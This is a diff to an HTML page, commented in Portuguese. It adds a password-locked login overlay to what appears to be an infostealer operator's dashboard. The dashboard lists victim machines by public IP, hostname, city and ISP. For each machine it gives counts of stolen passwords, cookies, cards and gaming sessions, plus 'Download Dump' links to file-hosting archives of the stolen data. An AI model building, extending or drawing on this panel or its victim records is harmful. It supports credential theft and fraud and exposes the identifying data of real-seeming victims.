@@ -5,31 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Painel de Login</title>
     <style>
-        /* Estilo para a tela de fundo escuro */
+        /* Fundo escuro cobrindo toda a página */
         #overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 9998;
+            background: linear-gradient(145deg, #1a1a1a, #000000);
+            z-index: 2147483647; /* Valor máximo do z-index */
             display: flex;
             justify-content: center;
             align-items: center;
+            pointer-events: all; /* Impede interação com elementos subjacentes */
         }
 
-        /* Estilo do iframe de login em tela cheia */
+        /* Estilo do iframe */
         #loginIframe {
             width: 100%;
             height: 100%;
             border: none;
+            position: absolute;
+            z-index: 2147483647;
+        }
+
+        /* Estilo para garantir que elementos indesejados sejam ocultados */
+        .hide-on-login {
+            display: none !important;
         }
     </style>
 </head>
 <body>
 
-    <!-- Fundo escuro, que vai cobrir a tela inteira -->
+    <!-- Fundo escuro que cobre a tela inteira -->
     <div id="overlay">
         <!-- Iframe de login -->
         <iframe id="loginIframe" srcdoc="
@@ -47,63 +55,70 @@
                     }
 
                     body {
-                        background: #333;
+                        background: linear-gradient(145deg, #000000, #1a1a1a);
                         display: flex;
                         justify-content: center;
                         align-items: center;
                         height: 100vh;
                         color: white;
-                        font-family: Arial, sans-serif;
-                        margin: 0;
+                        font-family: 'Arial', sans-serif;
                     }
 
                     .login-box {
-                        background: #444;
-                        padding: 20px;
-                        border-radius: 8px;
-                        width: 300px;
+                        background: #121212;
+                        padding: 30px;
+                        border-radius: 10px;
+                        width: 320px;
                         text-align: center;
-                        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
+                        box-shadow: 0 8px 24px rgba(255, 0, 0, 0.6);
                     }
 
                     .login-box h2 {
+                        color: #ff0000;
                         margin-bottom: 20px;
+                        font-size: 24px;
+                        font-weight: bold;
+                        text-transform: uppercase;
                     }
 
                     .login-box input {
                         width: 100%;
-                        padding: 10px;
-                        margin: 10px 0;
+                        padding: 12px;
+                        margin: 12px 0;
                         border-radius: 5px;
-                        border: none;
+                        border: 1px solid #444;
+                        background: #222;
+                        color: white;
                         font-size: 16px;
+                        outline: none;
+                    }
+
+                    .login-box input::placeholder {
+                        color: #888;
                     }
 
                     .login-box button {
                         width: 100%;
-                        padding: 10px;
+                        padding: 12px;
                         border-radius: 5px;
-                        background-color: #ff0000;
+                        background: #ff0000;
                         border: none;
                         font-size: 16px;
                         color: white;
+                        font-weight: bold;
                         cursor: pointer;
+                        transition: background 0.3s;
+                        text-transform: uppercase;
                     }
 
                     .login-box button:hover {
-                        background-color: #cc0000;
+                        background: #cc0000;
                     }
-
-                    /* Adicionando estilo extra para garantir que o formulário não saia da tela */
-                    input, button {
-                        box-sizing: border-box;
-                    }
-
                 </style>
             </head>
             <body>
                 <div class='login-box'>
-                    <h2>Login</h2>
+                    <h2>Painel de Login</h2>
                     <form id='loginForm'>
                         <input type='text' id='username' placeholder='Usuário' required><br>
                         <input type='password' id='password' placeholder='Senha' required><br>
@@ -112,35 +127,29 @@
                 </div>
 
                 <script>
-                    // Hash da senha predefinida (exemplo)
-                    const correctHash = 'e9bc95d4412b1d92fd42f1c29a38b622abc7135f6187d4355a31fbd7bd2bad8ca6c07abdc718958bd2ca3f79be1b091b7de0296577a776c5facee6af97ed21cf'; // Substitua com sua hash SHA-512
+                    const correctHash = 'c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec';
 
-                    // Função para calcular a hash SHA-512 de uma senha
                     async function hashPassword(password) {
                         const encoder = new TextEncoder();
                         const data = encoder.encode(password);
                         const hashBuffer = await crypto.subtle.digest('SHA-512', data);
                         const hashArray = Array.from(new Uint8Array(hashBuffer));
-                        const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('');
-                        return hashHex;
+                        return hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('');
                     }
 
-                    // Função para validar o login
                     document.getElementById('loginForm').addEventListener('submit', async function(event) {
-                        event.preventDefault(); // Impede o envio do formulário tradicional
+                        event.preventDefault();
 
                         const username = document.getElementById('username').value;
                         const password = document.getElementById('password').value;
 
-                        // Valida a senha com a hash predefinida
                         const passwordHash = await hashPassword(password);
 
                         if (passwordHash === correctHash) {
-                            // Se a senha for válida, desbloqueia a tela e remove o iframe de login
-                            parent.document.getElementById('overlay').style.display = 'none';  // Remove o fundo escuro
-                            parent.document.getElementById('loginIframe').style.display = 'none';  // Remove o iframe de login
+                            parent.document.getElementById('overlay').style.display = 'none';
+                            parent.document.getElementById('loginIframe').style.display = 'none';
                         } else {
-                            alert('Senha incorreta!'); // Exibe um alerta em caso de erro
+                            alert('Senha incorreta!');
                         }
                     });
                 </script>
@@ -149,8 +158,16 @@
         "></iframe>
     </div>
 
+    <!-- Elementos existentes que devem ser ocultados -->
+    <div class="hide-on-login">
+        <!-- Exemplo de elementos que seriam ocultados -->
+        <button>Botão Exemplo</button>
+    </div>
+
 </body>
 </html>
+
+
 
 <html lang="pt-BR">
 <head>
@@ -484,7 +501,7 @@
         <div class="dropdown">
             <button class="dropdown-button">Países</button>
             <div class="dropdown-content">
-<a href="#" onclick="filterByCountry('Brazil')">Brasil</a>
+<a href="#" onclick="filterByCountry('Brazil')">Brazil</a>
 <a href="#" onclick="filterByCountry('United States')">Estados Unidos</a>
 <a href="#" onclick="filterByCountry('Germany')">Alemanha</a>
 <a href="#" onclick="filterByCountry('China')">China</a>
@@ -712,7 +729,9 @@
             { 
                 "image": "https://i.ibb.co/p2RkXvD/Display-1.png", 
                 "ip": "192.168.1.66", 
-                "host": "DESKTOP-3P99ER7", 
+                "host": "DESKTOP-3P99ER7",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
                 "country": "United States", 
                 "countryFlag": "https://flagcdn.com/w320/us.png", 
                 "city": "N/A", 
@@ -727,7 +746,9 @@
             {
                 "image": "https://i.ibb.co/W5kKdMw/Display-1.png", 
                 "ip": "154.127.89.49", 
-                "host": "DESKTOP-IRT2M33", 
+                "host": "DESKTOP-IRT2M33",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
                 "country": "Africa", 
                 "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Flag_of_South_Africa.svg/1200px-Flag_of_South_Africa.svg.png", 
                 "city": "N/A", 
@@ -742,7 +763,9 @@
             {
                 "image": "https://i.ibb.co/gtfcc5m/Display-1.png", 
                 "ip": "27.125.242.233", 
-                "host": "JIMS-PC", 
+                "host": "JIMS-PC",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
                 "country": "Malaysia", 
                 "countryFlag": "https://st2.depositphotos.com/3905143/5949/i/450/depositphotos_59497371-stock-photo-malaysia-waving-flag.jpg", 
                 "city": "Kuala Lumpur", 
@@ -757,7 +780,9 @@
             {
                 "image": "https://i.ibb.co/Xpd32Cd/Display-1.png", 
                 "ip": "112.215.252.44", 
-                "host": "DESKTOP-5685S9L", 
+                "host": "DESKTOP-5685S9L",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
                 "country": "Indonesia", 
                 "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Flag_of_Indonesia.svg/800px-Flag_of_Indonesia.svg.png", 
                 "city": "South Tangerang", 
@@ -769,85 +794,297 @@
                 "session": "00", 
                 "downloadLink": "https://anonymfile.com/50dLg/4c4c4544-004b-5910-8056-b8c04f375731.zip",
             },
+            {
+                "image": "https://i.ibb.co/K75j1tb/Display-1.png", 
+                "ip": "179.251.133.71", 
+                "host": "DESKTOP-PFU9FDA",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Brazil", 
+                "countryFlag": "https://www.curitiba.pr.leg.br/atividade-parlamentar/legislacao/imagens/bandeira-do-brasil.png/image", 
+                "city": "Manaus", 
+                "timezone": "America/Manaus", 
+                "provider": "TIM S/A TIM S/A AS26615 TIM S/A", 
+                "passwords": "52", 
+                "cookies": "1889", 
+                "cards": "00", 
+                "session": "01", 
+                "downloadLink": "https://anonymfile.com/or9lO/e65c32ae-17df-11e8-ea96-641c67939877.zip",
+            },
+            {
+                "image": "https://i.ibb.co/xL1748v/Display-1.png", 
+                "ip": "37.40.92.155", 
+                "host": "AHMEDAL-GHADANIA",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Oman", 
+                "countryFlag": "https://media.istockphoto.com/id/1419222630/pt/vetorial/flag-of-the-oman-vector-illustration.jpg?s=612x612&w=0&k=20&c=qsUstGllxVjbQN92eBeR8v7kTob4if-GUEGdYwhyJwE=", 
+                "city": "Seeb", 
+                "timezone": "Asia/Muscat", 
+                "provider": "OmanMobile Telecommunication company LLC OmanMobile Telecommunication company LLC AS28885 Oman Telecommunications Company (S.A.O.G)", 
+                "passwords": "01", 
+                "cookies": "1180", 
+                "cards": "00", 
+                "session": "0", 
+                "downloadLink": "https://anonymfile.com/BEN6Y/4c4c4544-0032-4710-804b-cac04f564432.zip",
+            },
+            {
+                "image": "https://i.ibb.co/ygJyG68/Display-1.png", 
+                "ip": "41.111.198.172", 
+                "host": "N/A",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Algeria", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Flag_of_Algeria.svg/2560px-Flag_of_Algeria.svg.png", 
+                "city": "Béjaïa", 
+                "timezone": "Africa/Algiers", 
+                "provider": "Algerie Telecom  AS36947 Telecom Algeria", 
+                "passwords": "150", 
+                "cookies": "3374", 
+                "cards": "00", 
+                "session": "0", 
+                "downloadLink": "https://anonymfile.com/XNdbQ/4c4c4544-0048-3210-8053-b1c04f4e3733-1.zip",
+            },
+             {
+                "image": "https://i.ibb.co/HxQNy1L/Display-1.png", 
+                "ip": "41.111.198.172", 
+                "host": "N/A",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Algeria", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Flag_of_Algeria.svg/2560px-Flag_of_Algeria.svg.png", 
+                "city": "Béjaïa", 
+                "timezone": "Africa/Algiers", 
+                "provider": "Algerie Telecom  AS36947 Telecom Algeria", 
+                "passwords": "100", 
+                "cookies": "178", 
+                "cards": "00", 
+                "session": "0", 
+                "downloadLink": "https://anonymfile.com/Zg6Bp/4c4c4544-0048-3210-8053-b1c04f4e3733.zip",
+            },
+             {
+                "image": "https://i.ibb.co/Q6F7Srt/Display-1.png", 
+                "ip": "180.191.245.60", 
+                "host": "DESKTOP-C7PB4BI",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Philippines", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Flag_of_Algeria.svg/2560px-Flag_of_Algeria.svg.png", 
+                "city": "General Trias", 
+                "timezone": "Asia/Manila", 
+                "provider": "Globe Telecom  AS132199 Globe Telecom Inc.", 
+                "passwords": "77", 
+                "cookies": "1118", 
+                "cards": "00", 
+                "session": "0", 
+                "downloadLink": "https://anonymfile.com/PRaZ2/4c4c4544-0046-3410-8056-b4c04f483532.zip",
+            },
+            {
+                "image": "https://i.ibb.co/cT3dWYZ/Display-1.png", 
+                "ip": "154.127.89.49", 
+                "host": "DESKTOP-IRT2M33",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Niger", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Flag_of_Niger.svg/2389px-Flag_of_Niger.svg.png", 
+                "city": "Niamey", 
+                "timezone": "Africa/Niamey", 
+                "provider": "Societe Nigerienne des Telecommunications Fibre Optique AS37385 Societe Nigerienne des Telecommunications (SONITEL)", 
+                "passwords": "11", 
+                "cookies": "652", 
+                "cards": "00", 
+                "session": "0", 
+                "downloadLink": "https://anonymfile.com/dqOl6/4c4c4544-0054-3410-8035-b8c04f355131-1.zip",
+            },
+            {
+                "image": "https://i.ibb.co/FmtGTzR/Display-1.png", 
+                "ip": "146.70.132.172", 
+                "host": "PINTURA",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "United Kingdom", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Flag_of_the_United_Kingdom_%283-5%29.svg/255px-Flag_of_the_United_Kingdom_%283-5%29.svg.png", 
+                "city": "Stretford", 
+                "timezone": "Europe/London", 
+                "provider": "M247 Europe Infra M247 Ltd Manchester AS9009 M247 Europe SRL)", 
+                "passwords": "03", 
+                "cookies": "162", 
+                "cards": "00", 
+                "session": "0", 
+                "downloadLink": "https://anonymfile.com/6NJEJ/7b7d895d-5e01-11ec-8254-641c67e1572f.zip",
+            },
+            {
+                "image": "https://i.ibb.co/fFSC5wj/Display-1.png", 
+                "ip": "146.70.132.204", 
+                "host": "LENOVO-PINTURA",
+                "OS": "Windows 11",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "United Kingdom", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Flag_of_the_United_Kingdom_%283-5%29.svg/255px-Flag_of_the_United_Kingdom_%283-5%29.svg.png", 
+                "city": "Stretford", 
+                "timezone": "Europe/London", 
+                "provider": "M247 Europe Infra M247 Ltd Manchester AS9009 M247 Europe SRL)", 
+                "passwords": "04", 
+                "cookies": "162", 
+                "cards": "00", 
+                "session": "01 [Steam]", 
+                "downloadLink": "https://anonymfile.com/La9Oq/7b7d895d-5e01-11ec-8254-641c67e1572ff.zip",
+            },
+            {
+                "image": "https://i.ibb.co/jHTwrBt/Display-1.png", 
+                "ip": "187.250.234.239", 
+                "host": "DESKTOP-M0JM4ED",
+                "OS": "Windows 11",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Mexico", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Flag_of_Mexico.svg/2560px-Flag_of_Mexico.svg.png", 
+                "city": "Tijuana", 
+                "timezone": "America/Tijuana", 
+                "provider": "Uninet S.A. de C.V. Telefonos del Noroeste, S.A. de C.V AS8151 UNINET", 
+                "passwords": "21", 
+                "cookies": "5037", 
+                "cards": "00", 
+                "session": "00", 
+                "downloadLink": "https://anonymfile.com/kWxlV/18fd7b60-46bc-4980-8c2f-b4fcbf276d39.zip",
+            },
+            {
+                "image": "https://i.ibb.co/j36dQ3K/Display-1.png", 
+                "ip": "200.141.41.15", 
+                "host": "DESKTOP-DNMEJ9M",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Brazil", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Flag_of_Brazil.svg/1280px-Flag_of_Brazil.svg.png", 
+                "city": "Itaguaí", 
+                "timezone": "America/Sao_Paulo", 
+                "provider": "V tal V tal AS7738 V tal", 
+                "passwords": "01", 
+                "cookies": "00", 
+                "cards": "00", 
+                "session": "00", 
+                "downloadLink": "https://anonymfile.com/mknlo/035e02d8-04d3-05f3-d006-080700080009.zip",
+            },
+            {
+                "image": "https://i.ibb.co/7WcY5BH/Display-1.png", 
+                "ip": "181.46.164.69", 
+                "host": "DESKTOP-R1MJ8FE",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Argentina", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Flag_of_Argentina.svg/2560px-Flag_of_Argentina.svg.png", 
+                "city": "Villa Ballester", 
+                "timezone": "America/Argentina/Buenos_Aireso", 
+                "provider": "Telecentro S.A. Telecentro S.A. - Clientes Residenciales AS27747 Telecentro S.A.", 
+                "passwords": "702", 
+                "cookies": "00", 
+                "cards": "00", 
+                "session": "02 [Epic] / [Steam]", 
+                "downloadLink": "https://anonymfile.com/3DyQO/88aac609-f3fa-82d1-188c-af7c702898da.zip",
+            },
+            {
+                "image": "https://i.ibb.co/rs0GHGM/Display-1.png", 
+                "ip": "223.123.14.92", 
+                "host": "DESKTOP-RJLDFF4",
+                "OS": "Windows 10",
+                "OSIcon": "https://img.icons8.com/?size=512&id=108792&format=png",
+                "country": "Pakistan", 
+                "countryFlag": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Flag_of_Pakistan.svg/1200px-Flag_of_Pakistan.svg.png", 
+                "city": "Islamabad", 
+                "timezone": "Asia/Karachi", 
+                "provider": "CMPak Limited CMPak Limited AS59257 CMPak Limited", 
+                "passwords": "726", 
+                "cookies": "161", 
+                "cards": "00", 
+                "session": "00", 
+                "downloadLink": "https://anonymfile.com/jQDad/218aba47-91d0-11e7-8443-d85c7301c013.zip",
+            },
+          
+          
           
         ];
 
         const container = document.querySelector('.container');
-        const imageModal = document.getElementById('imageModal');
-        const modalImage = document.getElementById('modalImage');
-        const buildModal = document.getElementById('buildModal');
+const imageModal = document.getElementById('imageModal');
+const modalImage = document.getElementById('modalImage');
+const buildModal = document.getElementById('buildModal');
 
-        function renderMachines(data) {
-            container.innerHTML = '';
-            data.forEach(machine => {
-                const block = document.createElement('div');
-                block.classList.add('machine-block');
+function renderMachines(data) {
+    container.innerHTML = '';
+    data.forEach(machine => {
+        const block = document.createElement('div');
+        block.classList.add('machine-block');
 
-                const image = document.createElement('img');
-                image.classList.add('machine-image');
-                image.src = machine.image;
-                image.alt = `Imagem do ${machine.host}`;
-                image.onclick = () => openImageModal(machine.image);
+        const image = document.createElement('img');
+        image.classList.add('machine-image');
+        image.src = machine.image;
+        image.alt = `Imagem do ${machine.host}`;
+        image.onclick = () => openImageModal(machine.image);
 
-                const info = document.createElement('div');
-                info.classList.add('machine-info');
+        const info = document.createElement('div');
+        info.classList.add('machine-info');
 
-                const name = document.createElement('h3');
-                name.innerHTML = machine.host;
+        const name = document.createElement('h3');
+        name.innerHTML = machine.host;
 
-                const ip = document.createElement('p');
-                ip.innerHTML = `🛜: ${machine.ip}`;
+        const ip = document.createElement('p');
+        ip.innerHTML = `🌐: ${machine.ip}`;
 
-                const country = document.createElement('p');
-                country.innerHTML = `<img src="${machine.countryFlag}" alt="${machine.country}"> ${machine.country}`;
+        const countryElement = document.createElement('p');
+        countryElement.innerHTML = `<img src="${machine.countryFlag}" alt="${machine.country}"> ${machine.country}`;
+        
+        const osElement = document.createElement('p');
+        osElement.innerHTML = `<img src="${machine.OSIcon}" alt="${machine.OS}" style="width: 20px; height: 20px; margin-right: 8px;"> ${machine.OS}`;
 
-                const city = document.createElement('p');
-                city.innerHTML = `🏙️ ${machine.city}`;
+        const city = document.createElement('p');
+        city.innerHTML = `🏙️ ${machine.city}`;
 
-                const timezone = document.createElement('p');
-                timezone.innerHTML = `🌏 ${machine.timezone}`;
+        const timezone = document.createElement('p');
+        timezone.innerHTML = `🌏 ${machine.timezone}`;
 
-                const provider = document.createElement('p');
-                provider.innerHTML = `ℹ️ ${machine.provider}`;
+        const provider = document.createElement('p');
+        provider.innerHTML = `ℹ️ ${machine.provider}`;
 
-                const divider = document.createElement('div');
-                divider.classList.add('divider');
+        const divider = document.createElement('div');
+        divider.classList.add('divider');
 
-                const passwords = document.createElement('p');
-                passwords.innerHTML = `🔑 Senhas: ${machine.passwords}`;
+        const passwords = document.createElement('p');
+        passwords.innerHTML = `🔑 Senhas: ${machine.passwords}`;
 
-                const cookies = document.createElement('p');
-                cookies.innerHTML = `🍪 Cookies: ${machine.cookies}`;
+        const cookies = document.createElement('p');
+        cookies.innerHTML = `🍪 Cookies: ${machine.cookies}`;
 
-                const cards = document.createElement('p');
-                cards.innerHTML = `💳 Cartões: ${machine.cards}`;
+        const cards = document.createElement('p');
+        cards.innerHTML = `💳 Cartões: ${machine.cards}`;
 
-                const session = document.createElement('p');
-                session.innerHTML = `🖥️ Sessões: ${machine.session}`;
+        const session = document.createElement('p');
+        session.innerHTML = `🖥️ Sessões: ${machine.session}`;
 
-                const downloadButton = document.createElement('button');
-                downloadButton.classList.add('download-button');
-                downloadButton.innerHTML = '⬇️Download Dump';
-                downloadButton.onclick = () => downloadMachine(machine.downloadLink);
+        const downloadButton = document.createElement('button');
+        downloadButton.classList.add('download-button');
+        downloadButton.innerHTML = '⬇️Download Dump';
+        downloadButton.onclick = () => downloadMachine(machine.downloadLink);
 
-                info.appendChild(name);
-                info.appendChild(ip);
-                info.appendChild(country);
-                info.appendChild(city);
-                info.appendChild(timezone);
-                info.appendChild(provider);
-                info.appendChild(divider);
-                info.appendChild(passwords);
-                info.appendChild(cookies);
-                info.appendChild(cards);
-                info.appendChild(session);
-                info.appendChild(downloadButton);
+        // Adicionando os elementos ao bloco
+        info.appendChild(name);
+        info.appendChild(ip);
+        info.appendChild(countryElement);
+        info.appendChild(osElement);
+        info.appendChild(city);
+        info.appendChild(timezone);
+        info.appendChild(provider);
+        info.appendChild(divider);
+        info.appendChild(passwords);
+        info.appendChild(cookies);
+        info.appendChild(cards);
+        info.appendChild(session);
+        info.appendChild(downloadButton);
 
-                block.appendChild(image);
-                block.appendChild(info);
-                container.appendChild(block);
-            });
-        }
+        block.appendChild(image);
+        block.appendChild(info);
+        container.appendChild(block);
+    });
+}
+
 
         function openImageModal(imageSrc) {
             modalImage.src = imageSrc;
